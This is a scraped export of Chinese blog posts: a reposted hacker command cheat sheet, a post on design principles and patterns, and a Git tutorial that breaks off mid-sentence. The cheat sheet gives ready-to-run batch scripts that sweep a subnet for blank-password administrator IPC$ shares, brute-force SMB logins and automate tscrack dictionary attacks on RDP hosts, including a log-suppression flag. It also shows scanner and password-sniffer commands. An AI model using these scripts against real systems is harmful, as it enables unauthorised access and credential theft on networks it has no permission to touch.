显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>\nuse mysql；<br>\nshow tables; 显示库中的数据表<br>\ndescribe 表名; 显示数据表的结构<br>\ncreate database 库名; 建库<br>\nuse 库名；<br>\ncreate table 表名 (字段设定列表)； 建表<br>\ndrop database 库名;<br>\ndrop table 表名； 删库和删表<br>\ndelete from 表名; 将表中记录清空<br>\nselect * from 表名; 显示表中的记录<br>\nmysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br><strong>win2003系统下新增命令（实用部份）： </strong><br>\nshutdown /参数 关闭或重启本地或远程主机。<br>\n参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>\n例：shutdown /r /t 0 立即重启本地主机（无延时）<br>\ntaskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>\n参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>\ntasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>\n参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>\n\n<p><strong>Linux系统下基本命令： 要区分大小写 </strong><br>\nuname 显示版本信息（同win2K的 ver）<br>\ndir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>\npwd 查询当前所在的目录位置<br>\ncd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>\ncat 文件名 查看文件内容<br>\ncat &gt;abc.txt 往abc.txt文件中写上内容。<br>\nmore 文件名 以一页一页的方式显示一个文本文件。<br>\ncp 复制文件<br>\nmv 移动文件<br>\nrm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>\nmkdir 目录名 建立目录<br>\nrmdir 删除子目录，目录内没有文档。<br>\nchmod 设定档案或目录的存取权限<br>\ngrep 在档案中查找字符串<br>\ndiff 档案文件比较<br>\nfind 档案搜寻<br>\ndate 现在的日期、时间<br>\nwho 查询目前和你使用同一台机器的人以及Login时间地点<br>\nw 查询目前上机者的详细资料<br>\nwhoami 查看自己的帐号名称<br>\ngroups 查看某人的Group<br>\npasswd 更改密码<br>\nhistory 查看自己下过的命令<br>\nps 显示进程状态<br>\nkill 停止某进程<br>\ngcc 黑客通常用它来编译C语言写的文件<br>\nsu 权限转换为指定使用者<br>\ntelnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>\nftp ftp连接上某服务器（同win2K）</p>\n\n<p><strong>windows 系统下CMD命令大全</strong></p>\n\n<p>计算机运行命令全集 winver---------检查Windows版本<br>\nwmimgmt.msc----打开windows管理体系结构<br>\nwupdmgr--------windows更新程序<br>\nwinver---------检查Windows版本<br>\nwmimgmt.msc----打开windows管理体系结构<br>\nwupdmgr--------windows更新程序<br>\nwwww--------windows脚本宿主设置<br>\nwrite----------写字板winmsd-----系统信息<br>\nwiaacmgr-------扫描仪和照相机向导<br>\nwinchat--------XP自带局域网聊天<br>\nmem.exe--------显示内存使用情况<br>\nMsconfig.exe---系统配置实用程序<br>\nmplayer2-------简易widnows media player<br>\nmspaint--------画图板<br>\nmstsc----------远程桌面连接<br>\nmplayer2-------媒体播放机<br>\nmagnify--------放大镜实用程序<br>\nmmc------------打开控制台<br>\nmobsync--------同步命令<br>\ndxdiag---------检查directx信息<br>\ndrwtsn32------ 系统医生<br>\ndevmgmt.msc--- 设备管理器<br>\ndfrg.msc-------磁盘碎片整理程序<br>\ndiskmgmt.msc---磁盘管理实用程序<br>\ndcomcnfg-------打开系统组件服务<br>\nddeshare-------打开DDE共享设置<br>\ndvdplay--------DVD播放器<br>\nnet stop messenger-----停止信使服务<br>\nnet start messenger----开始信使服务<br>\nnotepad--------打开记事本<br>\nnslookup-------网络管理的工具向导<br>\nntbackup-------系统备份和还原<br>\nnarrator-------屏幕\"讲述人\"<br>\nntmsmgr.msc----移动存储管理器<br>\nntmsoprq.msc---移动存储管理员操作请求<br>\nnetstat -an----(TC)命令检查接口<br>\nsyncapp--------创建一个公文包<br>\nsysedit--------系统配置编辑器<br>\nsigverif-------文件签名验证程序<br>\nsndrec32-------录音机<br>\nshrpubw--------创建共享文件夹<br>\nsecpol.msc-----本地安全策略<br>\nsyskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码<br>\nservices.msc---本地服务设置<br>\nSndvol32-------音量控制程序<br>\nsfc.exe--------系统文件检查器<br>\nsfc /scannow---windows文件保护<br>\ntsshutdn-------60秒倒计时关机命令<br>\ntourstart------xp简介（安装完成后出现的漫游xp程序）<br>\ntaskmgr--------任务管理器<br>\neventvwr-------事件查看器<br>\neudcedit-------造字程序<br>\nexplorer-------打开资源管理器<br>\npackager-------对象包装程序<br>\nperfmon.msc----计算机性能监测程序<br>\nprogman--------程序管理器<br>\nregedit.exe----注册表<br>\nrsop.msc-------组策略结果集<br>\nregedt32-------注册表编辑器<br>\nrononce -p ----15秒关机<br>\nregsvr32 /u *.dll----停止dll文件运行<br>\nregsvr32 /u zipfldr.dll------取消ZIP支持<br>\ncmd.exe--------CMD命令提示符<br>\nchkdsk.exe-----Chkdsk磁盘检查<br>\ncertmgr.msc----证书管理实用程序<br>\ncalc-----------启动计算器<br>\ncharmap--------启动字符映射表<br>\ncliconfg-------SQL SERVER 客户端网络实用程序<br>\nClipbrd--------剪贴板查看器<br>\nconf-----------启动netmeeting<br>\ncompmgmt.msc---计算机管理<br>\ncleanmgr-------**整理<br>\nciadv.msc------索引服务程序<br>\nosk------------打开屏幕键盘<br>\nodbcad32-------ODBC数据源管理器<br>\noobe/msoobe /a----检查XP是否激活<br>\nlusrmgr.msc----本机用户和组<br>\nlogoff---------注销命令<br>\niexpress-------木马捆绑工具，系统自带<br>\nNslookup-------IP地址侦测器<br>\nfsmgmt.msc-----共享文件夹管理器<br>\nutilman--------辅助工具管理器<br>\ngpedit.msc-----组策略</p>\n\n<p><strong>批处理命令与变量</strong></p>\n\n<p>1：for命令及变量 基本格式：<br>\nFOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>\n批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3</p>\n\n<p>(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个\"1\"指起始值，第二个\"1\"指增长量，第三个\"254\"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }</p>\n\n<p>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>\ncommand_parameters：为特定命令指定参数或命令行开关</p>\n\n<p>IN (set)：指在(set)中取值；DO command ：指执行command</p>\n\n<p>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。<br>\n用法举例：<br>\n@echo off<br>\necho 用法格式：test.bat *.*.* &gt; test.txt</p>\n\n<p>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find \"命令成功完成\" &gt;&gt;test.txt<br>\n存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</p>\n\n<p>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有\"命令成功完成\"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>\n@echo off<br>\necho 用法格式：ok.bat ip<br>\nFOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200<br>\n存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>\n七：<br>\n2：if命令及变量 基本格式：<br>\nIF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。<br>\n例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>\n0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>\nIF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>\n例：“if \"%2%\"==\"4\" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加\" \"）<br>\nIF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>\n <br>\n例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到\":end\"标签处。<br>\nIF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. else echo test.txt.missing ”，注意命令中的“.”</p>\n\n<p><strong>终端服务密码破解 tscrack:</strong><br>\n参数说明<br>\n-h 显示使用帮助<br>\n-v 显示版本信息<br>\n-s 在屏幕上打出解密能力<br>\n-b 密码错误时发出的声音<br>\n-t 同是发出多个连接（多线程）<br>\n-N Prevent System Log entries on targeted server<br>\n-U 卸载移除tscrack组件<br>\n-f 使用－f后面的密码<br>\n-F 间隔时间（频率）<br>\n-l 使用－l后面的用户名<br>\n-w 使用－w后面的密码字典<br>\n-p 使用－p后面的密码<br>\n-D 登录主页面<br>\n用法示例<br>\ntscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>\ntscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>\n@if not exist ipcscan.txt goto noscan<br>\n@for /f \"tokens=1 delims= \" %%i in (3389.txt) do call hack.bat %%i<br>\nnscan<br>\n@echo 3389.txt no find or scan faild<br>\n(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>\n3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>\n@if not exist tscrack.exe goto noscan<br>\n@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>\n:noscan<br>\n@echo tscrack.exe no find or scan faild<br>\n(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>\nhack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>\n\n<p><strong>扫描工具：xscan</strong><br>\n基本格式<br>\nxscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚\"起始IP到终止IP\"段的所有主机信息<br>\nxscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚\"主机IP列表文件名\"中的所有主机信息<br>\n检测项目<br>\n-active 检测主机是否存活<br>\n-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>\n-port 检测常用服务的端口状态<br>\n-ftp 检测FTP弱口令<br>\n-pub 检测FTP服务匿名用户写权限<br>\n-pop3 检测POP3-Server弱口令<br>\n-smtp 检测SMTP-Server漏洞<br>\n-sql 检测SQL-Server弱口令<br>\n-smb 检测NT-Server弱口令<br>\n-iis 检测IIS编码/解码漏洞<br>\n-cgi 检测CGI漏洞<br>\n-nasl 加载Nessus攻击脚本<br>\n-all 检测以上所有项目<br>\n其它选项<br>\n-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过\"-l\"参数获取<br>\n-l 显示所有网络适配器<br>\n-v 显示详细扫描进度<br>\n-p 跳过没有响应的主机<br>\n-o 跳过没有检测到开放端口的主机<br>\n-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>\n-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>\n用法示例<br>\nxscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>\nxscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>\nxscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>\n\n<p>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p>\n\n<p><strong>FTP的命令行格式为： </strong><br>\nftp -v -d -i -n -g [主机名] ，其中</p>\n\n<p>-v 显示远程服务器的所有响应信息</p>\n\n<p>-n 限制ftp的自动登录，即不使用；.n etrc文件；</p>\n\n<p>-d 使用调试方式；</p>\n\n<p>-g 取消全局文件名。</p>\n\n<p>FTP使用的内部命令如下(中括号表示可选项):</p>\n\n<p>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip<br>\n2.$ macro-ame[args]： 执行宏定义macro-name。</p>\n\n<p>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>\n4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>\n\n<p>5.ascii：使用ascii类型传输方式。<br>\n6.bell：每个命令执行完毕后计算机响铃一次。</p>\n\n<p>7.bin：使用二进制文件传输方式。<br>\n8.bye：退出ftp会话过程。</p>\n\n<p>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>\n10.cd remote-dir：进入远程主机目录。</p>\n\n<p>11.cdup：进入远程主机目录的父目录。<br>\n12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p>\n\n<p>13.close：中断与远程服务器的ftp会话(与open对应)。<br>\n14.cr：使用asscii方式传输文件时，将回车换行转换为回行。</p>\n\n<p>15.delete remote-file：删除远程主机文件。<br>\n16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>\n\n<p>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>\n18.disconNECtion：同close。</p>\n\n<p>19.form format：将文件传输方式设置为format，缺省为file方式。<br>\n20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p>\n\n<p>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>\n22.hash：每传输1024字节，显示一个hash符号(#)。</p>\n\n<p>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。<br>\n24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>\n\n<p>25.image：设置二进制传输方式(同binary)。<br>\n26.lcd[dir]：将本地工作目录切换至dir。</p>\n\n<p>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>\n28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p>\n\n<p>29.mdelete[remote-file]：删除远程主机文件。<br>\n30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。</p>\n\n<p>31.mget remote-files：传输多个远程文件。<br>\n32.mkdir dir-name：在远程主机中建一目录。</p>\n\n<p>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>\n34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p>\n\n<p>35.modtime file-name：显示远程主机文件的最后修改时间。<br>\n36.mput local-file：将多个文件传输至远程主机。</p>\n\n<p>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>\n38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p>\n\n<p>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。<br>\n40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p>\n\n<p>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>\n42.passive：进入被动传输方式。</p>\n\n<p>43.prompt：设置多个文件传输时的交互提示。<br>\n44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>\n45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>\n46.pwd：显示远程主机的当前工作目录。</p>\n\n<p>47.quit：同bye，退出ftp会话。<br>\n48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.</p>\n\n<p>49.recv remote-file[local-file]：同get。<br>\n50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p>\n\n<p>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>\n52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>\n\n<p>53.rename[from][to]：更改远程主机文件名。<br>\n54.reset：清除回答队列。</p>\n\n<p>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>\n56.rmdir dir-name：删除远程主机目录。</p>\n\n<p>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>\n58.send local-file[remote-file]：同put。</p>\n\n<p>59.sendport：设置PORT命令的使用。<br>\n60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。</p>\n\n<p>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>\n62.status：显示当前ftp状态。</p>\n\n<p>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>\n64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p>\n\n<p>65.system：显示远程主机的操作系统类型。<br>\n66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p>\n\n<p>67.tick：设置传输时的字节计数器。<br>\n68.trace：设置包跟踪。</p>\n\n<p>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>\n70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p>\n\n<p>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>\n72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p>\n\n<p>73.[cmd]：同help.</p>\n\n<p><strong>命令行方式嗅探器xsniff</strong><br>\n可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>\n参数说明<br>\n-tcp 输出TCP数据报<br>\n-udp 输出UDP数据报<br>\n-icmp 输出ICMP数据报<br>\n-pass 过滤密码信息<br>\n-hide 后台运行<br>\n-host 解析主机名<br>\n-addr IP地址 过滤IP地址<br>\n-port 端口 过滤端口<br>\n-log 文件名 将输出保存到文件<br>\n-asc 以ASCII形式输出<br>\n-hex 以16进制形式输出<br>\n用法示例<br>\nxsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>\nxsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p>\n\n<p>转载地址:<a href=\"https://www.jb51.net/article/87401.htm\" rel=\"nofollow\">https://www.jb51.net/article/87401.htm</a></p>                                    </div>", "log_PostTime": 1584891079, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python七大原则，24种设计模式", "log_Intro": "Python七大原则，24种设计模式", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3><strong>七大设计原则：</strong> </h3>\n\n<p><br>\n1、单一职责原则【SINGLE RESPONSIBILITY PRINCIPLE】：一个类负责一项职责. <br>\n2、里氏替换原则【LISKOV SUBSTITUTION PRINCIPLE】：继承与派生的规则.（子类可替换父类） <br>\n3、依赖倒转原则【DEPENDENCE INVERSION PRINCIPLE】：高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。即针对接口编程，不要针对实现编程。 <br>\n4、接口隔离原则【INTERFACE SEGREGATION PRINCIPLE】：建立单一接口，不要建立庞大臃肿的接口，尽量细化接口，接口中的方法尽量少。 <br>\n5、迪米特法则【LOW OF DEMETER】：高内聚 低耦合 – high cohesion low coupling <br>\n6、开闭原则【OPEN CLOSE PRINCIPLE】：一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。 <br>\n7、组合/聚合复用原则【Composition/Aggregation Reuse Principle(CARP) 】：尽量使用组合和聚合少使用继承的关系来达到复用的原则。</p>\n\n<h3>24种设计模式： </h3>\n\n<p><br><strong>一、创建型模式 </strong></p>\n\n<p><br>\n1、抽象工厂模式(Abstract factory pattern): 提供一个接口, 用于创建相关或依赖对象的家族, 而不需要指定具体类. <br>\n2、生成器模式(Builder pattern): 使用生成器模式封装一个产品的构造过程, 并允许按步骤构造. 将一个复杂对象的构建与它的表示分离, 使得同样的构建过程可以创建不同的表示. <br>\n3、工厂模式(factory method pattern): 定义了一个创建对象的接口, 但由子类决定要实例化的类是哪一个. 工厂方法让类把实例化推迟到子类. <br>\n4、原型模式(prototype pattern): 当创建给定类的实例过程很昂贵或很复杂时, 就使用原形模式. <br>\n5、单例了模式(Singleton pattern): 确保一个类只有一个实例, 并提供全局访问点. <br>\n6、多例模式(Multition pattern): 在一个解决方案中结合两个或多个模式, 以解决一般或重复发生的问题. </p>\n\n<p><br><strong>二、结构型模式 </strong></p>\n\n<p><br>\n1、适配器模式(Adapter pattern): 将一个类的接口, 转换成客户期望的另一个接口. 适配器让原本接口不兼容的类可以合作无间. 对象适配器使用组合, 类适配器使用多重继承. <br>\n2、桥接模式(Bridge pattern): 使用桥接模式通过将实现和抽象放在两个不同的类层次中而使它们可以独立改变. <br>\n3、组合模式(composite pattern): 允许你将对象组合成树形结构来表现”整体/部分”层次结构. 组合能让客户以一致的方式处理个别对象以及对象组合. <br>\n4、装饰者模式(decorator pattern): 动态地将责任附加到对象上, 若要扩展功能, 装饰者提供了比继承更有弹性的替代方案. <br>\n5、外观模式(facade pattern): 提供了一个统一的接口, 用来访问子系统中的一群接口. 外观定义了一个高层接口, 让子系统更容易使用. <br>\n6、亨元模式(Flyweight Pattern): 如想让某个类的一个实例能用来提供许多”虚拟实例”, 就使用蝇量模式. <br>\n7、代理模式(Proxy pattern): 为另一个对象提供一个替身或占位符以控制对这个对象的访问. </p>\n\n<p><br><strong>三、行为型模式 </strong></p>\n\n<p><br>\n1、责任链模式(Chain of responsibility pattern): 通过责任链模式, 你可以为某个请求创建一个对象链. 每个对象依序检查此请求并对其进行处理或者将它传给链中的下一个对象. <br>\n2、命令模式(Command pattern): 将”请求”封闭成对象, 以便使用不同的请求,队列或者日志来参数化其他对象. 命令模式也支持可撤销的操作. <br>\n3、解释器模式(Interpreter pattern): 使用解释器模式为语言创建解释器. <br>\n4、迭代器模式(iterator pattern): 提供一种方法顺序访问一个聚合对象中的各个元素, 而又不暴露其内部的表示. <br>\n5、中介者模式(Mediator pattern) : 使用中介者模式来集中相关对象之间复杂的沟通和控制方式. <br>\n6、备忘录模式(Memento pattern): 当你需要让对象返回之前的状态时(例如, 你的用户请求”撤销”), 你使用备忘录模式. <br>\n7、观察者模式(observer pattern): 在对象之间定义一对多的依赖, 这样一来, 当一个对象改变状态, 依赖它的对象都会收到通知, 并自动更新. <br>\n8、状态模式(State pattern): 允许对象在内部状态改变时改变它的行为, 对象看起来好象改了它的类. <br>\n9、策略模式(strategy pattern): 定义了算法族, 分别封闭起来, 让它们之间可以互相替换, 此模式让算法的变化独立于使用算法的客户. <br>\n10、模板方法模式(Template pattern): 在一个方法中定义一个算法的骨架, 而将一些步骤延迟到子类中. 模板方法使得子类可以在不改变算法结构的情况下, 重新定义算法中的某些步骤. <br>\n11、访问者模式(visitor pattern): 当你想要为一个对象的组合增加新的能力, 且封装并不重要时, 就使用访问者模式.</p>\n\n<p>转载文章地址:<a href=\"https://www.cnblogs.com/mac1993/p/9300962.html\" rel=\"nofollow\">https://www.cnblogs.com/mac1993/p/9300962.html</a></p>                                    </div>", "log_PostTime": 1584891080, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Git使用详细教程", "log_Intro": "Git使用详细教程", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>一：Git是什么？<br>\nGit是目前世界上最先进的分布式版本控制系统。<br>\n工作原理 / 流程：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c31e4400013bc911720340.png\"><br>\nWorkspace：工作区<br>\nIndex / Stage：暂存区<br>\nRepository：仓库区（或本地仓库）<br>\nRemote：远程仓库</p>\n\n<p>二：SVN与Git的最主要的区别？</p>\n\n<p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而干活的时候，用的都是自己的电脑，所以首先要从中央服务器哪里得到最新的版本，然后干活，干完后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，如果在局域网还可以，带宽够大，速度够快，如果在互联网下，如果网速慢的话，就纳闷了。</p>\n\n<p>Git是分布式版本控制系统，那么它就没有中央服务器的，每个人的电脑就是一个完整的版本库，这样，工作的时候就不需要联网了，因为版本都是在自己的电脑上。既然每个人的电脑都有一个完整的版本库，那多个人如何协作呢？比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p>\n\n<p>三、在windows上如何安装Git？</p>\n\n<p>msysgit是 windows版的Git,如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1cfa400019aee02460029.jpg\"><br>\n需要从网上下载一个，然后进行默认安装即可。安装完成后，在开始菜单里面找到 \"Git --&gt; Git Bash\",如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1cfd20001c2d602530073.jpg\"><br>\n会弹出一个类似的命令窗口的东西，就说明Git安装成功。如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1cfe70001462e06680380.jpg\"></p>\n\n<p>安装完成后，还需要最后一步设置，在命令行输入如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d041000110d906460213.jpg\"><br>\n因为Git是分布式版本控制系统，所以需要填写用户名和邮箱作为一个标识。</p>\n\n<p>注意：git config --global 参数，有了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然你也可以对某个仓库指定的不同的用户名和邮箱。</p>\n\n<p>四：如何操作？</p>\n\n<p>一：创建版本库。</p>\n\n<p>什么是版本库？版本库又名仓库，英文名repository,你可以简单的理解一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改，删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻还可以将文件”还原”。</p>\n\n<p>所以创建一个版本库也非常简单，如下我是D盘 –&gt; www下 目录下新建一个testgit版本库。</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d1060001909005780268.png\"><br>\npwd 命令是用于显示当前的目录。</p>\n\n<ol><li>\n\t<p>通过命令 git init 把这个目录变成git可以管理的仓库，如下：</p>\n\n\t<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d12b0001b08305270077.png\"></p>\n\n\t<p>这时候你当前testgit目录下会多了一个.git的目录，这个目录是Git来跟踪管理版本的，没事千万不要手动乱改这个目录里面的文件，否则，会把git仓库给破坏了。如下：</p>\n\n\t<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d143000112df06120173.png\"></p>\n\n\t<ol><li>\n\t\t<p>把文件添加到版本库中。</p>\n\n\t\t<p>首先要明确下，所有的版本控制系统，只能跟踪文本文件的改动，比如txt文件，网页，所有程序的代码等，Git也不列外，版本控制系统可以告诉你每次的改动，但是图片，视频这些二进制文件，虽能也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是知道图片从1kb变成2kb，但是到底改了啥，版本控制也不知道。</p>\n\t\t</li>\n\t</ol><p>下面先看下demo如下演示：</p>\n\n\t<p>我在版本库testgit目录下新建一个记事本文件 readme.txt 内容如下：11111111</p>\n\n\t<p>第一步：使用命令 git add readme.txt添加到暂存区里面去。如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2080001e4bb04490080.png\"><br>\n\t如果和上面一样，没有任何提示，说明已经添加成功了。</p>\n\n\t<p>第二步：用命令 git 